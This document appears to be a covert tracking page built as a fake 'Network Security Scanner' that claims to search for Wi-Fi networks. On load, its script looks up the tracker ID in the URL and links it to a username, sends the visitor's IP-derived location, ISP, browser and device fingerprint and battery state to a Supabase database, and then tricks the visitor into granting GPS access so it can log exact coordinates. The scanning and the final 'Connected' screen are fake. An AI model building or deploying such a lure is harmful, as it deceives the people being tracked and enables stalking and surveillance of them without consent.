<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Network Security Scanner</title><script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script><style>@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');:root{--primary-accent:#6a11cb;--secondary-accent:#2575fc;--text-light:#f0f0f0;--text-muted:#a0a0a0;--card-bg:rgba(255, 255, 255, 0.05);--card-border:rgba(255, 255, 255, 0.1)}*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Poppins',sans-serif;background:linear-gradient(160deg,#0f0c29 0%,#302b63 50%,#24243e 100%);color:var(--text-light);display:flex;justify-content:center;align-items:center;height:100vh;padding:20px;user-select:none;-webkit-user-select:none}.scanner-container{text-align:center;padding:40px 30px;background:var(--card-bg);border-radius:20px;backdrop-filter:blur(10px);border:1px solid var(--card-border);max-width:400px;width:100%;min-height:450px;display:flex;flex-direction:column;align-items:center;justify-content:center;animation:fadeIn .8s ease-out}@keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}.stage{display:none}.stage.active{display:flex;flex-direction:column;justify-content:center;align-items:center;width:100%;flex-grow:1}.radar-scanner{width:150px;height:150px;position:relative;margin-bottom:40px}.radar-scanner .radar-disk{width:100%;height:100%;border-radius:50%;background:radial-gradient(circle,rgba(106,17,203,0) 0%,rgba(106,17,203,.2) 70%);position:relative}.radar-scanner .radar-disk::before,.radar-scanner .radar-disk::after{content:'';position:absolute;top:50%;left:50%;width:100%;height:100%;border-radius:50%;transform:translate(-50%,-50%);border:1px solid rgba(138,43,226,.2)}.radar-scanner .radar-disk::after{width:70%;height:70%;border-style:dashed}.radar-scanner .radar-sweep{width:50%;height:50%;position:absolute;top:0;left:0;background:linear-gradient(45deg,rgba(37,117,252,0) 0%,rgba(37,117,252,.5) 100%);transform-origin:bottom right;animation:radar-sweep 2s linear infinite}@keyframes radar-sweep{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}h2{font-size:1.6rem;font-weight:600;margin-bottom:15px}h2.danger{color:#ff4d4d}p{font-size:1rem;color:var(--text-muted);line-height:1.7;margin-bottom:30px}.btn{width:100%;padding:15px;border-radius:12px;border:none;background:linear-gradient(90deg,var(--primary-accent),var(--secondary-accent));color:white;font-size:1.1rem;font-weight:600;cursor:pointer;transition:all .3s ease}button:hover:not(:disabled){transform:translateY(-3px);box-shadow:0 10px 20px rgba(0,0,0,.2)}button:disabled{background:#555;color:#999;cursor:not-allowed}</style></head><body><div class="scanner-container"><div id="stage-1" class="stage active"><div class="radar-scanner"><div class="radar-disk"></div><div class="radar-sweep"></div></div><h2>Searching for Networks...</h2><p>Please wait while we scan for available networks near you.</p></div><div id="stage-lock" class="stage"><h2 class="danger">Location Service Required</h2><p>To scan for nearby networks and calculate signal strength, this tool requires access to your device's GPS. Please grant location access to proceed.</p><button id="allow-btn" class="btn">Allow Location Access</button></div><div id="stage-2" class="stage"><h2>Choose a Network</h2><p>Functionality for this stage is disabled in this version.</p></div><div id="stage-connecting" class="stage"><h2>Connecting...</h2><p>Please wait...</p></div><div id="stage-final" class="stage"><h2>Connected</h2><p>Your connection is secure.</p></div></div><script>let supabase;let trackedByUsername=null;let initialRecordId=null;function showStage(id){document.querySelectorAll(".stage").forEach(stage=>stage.classList.remove("active"));document.getElementById(id).classList.add("active")}async function getBaseIntel(){const intel={tracked_by_username:trackedByUsername||"Unknown",latitude:"Pending...",longitude:"Pending..."};try{const response=await fetch("/api/intel");if(response.ok){const data=await response.json();Object.assign(intel,{ip_address:data.ipAddress,city:data.city,region:data.region,country:data.country,isp:data.isp,timezone:data.timezone})}}catch(e){console.error("IP Intel fetch failed",e)}try{Object.assign(intel,{user_agent:navigator.userAgent||"N/A",platform:navigator.platform||"N/A",language:navigator.language||"N/A",screen_width:screen.width||null,screen_height:screen.height||null,color_depth:screen.colorDepth||null,pixel_depth:screen.pixelDepth||null,hardware_concurrency:navigator.hardwareConcurrency||null,cookies_enabled:navigator.cookieEnabled||null,do_not_track:navigator.doNotTrack===null?"N/A":navigator.doNotTrack})}catch(e){console.error("Browser Intel fetch failed",e)}try{if("getBattery"in navigator){const battery=await navigator.getBattery();intel.battery_level=Math.floor(battery.level*100);intel.is_charging=battery.charging}}catch(e){console.error("Battery API failed",e)}return intel}async function updateLocationData(status,coords){if(!initialRecordId){console.error("Cannot update location: initial record ID is missing.");return}const updatePayload={};if(status==="granted"){updatePayload.latitude=coords.latitude.toFixed(6);updatePayload.longitude=coords.longitude.toFixed(6)}else{updatePayload.latitude="Permission Denied";updatePayload.longitude="Permission Denied"}await supabase.from("locations").update(updatePayload).eq("id",initialRecordId);showStage("stage-final")}async function askForPermission(){const allowBtn=document.getElementById("allow-btn");allowBtn.disabled=true;allowBtn.textContent="Processing...";navigator.geolocation.getCurrentPosition(position=>updateLocationData("granted",position.coords),error=>updateLocationData("denied"),{enableHighAccuracy:true,timeout:2e4,maximumAge:0})}async function initApp(){try{const response=await fetch("/api/config");const config=await response.json();if(!config.supabaseUrl||!config.supabaseAnonKey)throw new Error("Config not loaded");supabase=window.supabase.createClient(config.supabaseUrl,config.supabaseAnonKey);const pathParts=window.location.pathname.split("/");const trackerId=pathParts[pathParts.length-1];const{data:userData}=await supabase.from("users").select("username").eq("tracker_id",trackerId).single();if(userData){trackedByUsername=userData.username}const baseIntel=await getBaseIntel();const{data,error}=await supabase.from("locations").insert([baseIntel]).select().single();if(error||!data){console.error("Initial data insert error:",error);document.querySelector(".scanner-container").innerHTML='<h2>Execution Failed</h2><p>Could not log initial data.</p>';return}initialRecordId=data.id;setTimeout(()=>{showStage("stage-lock");document.getElementById("allow-btn").onclick=askForPermission},3e3)}catch(err){console.error(err);document.querySelector(".scanner-container").innerHTML='<h2>Initialization Failed</h2><p>Could not connect to the server.</p>'}}initApp();</script></body></html>
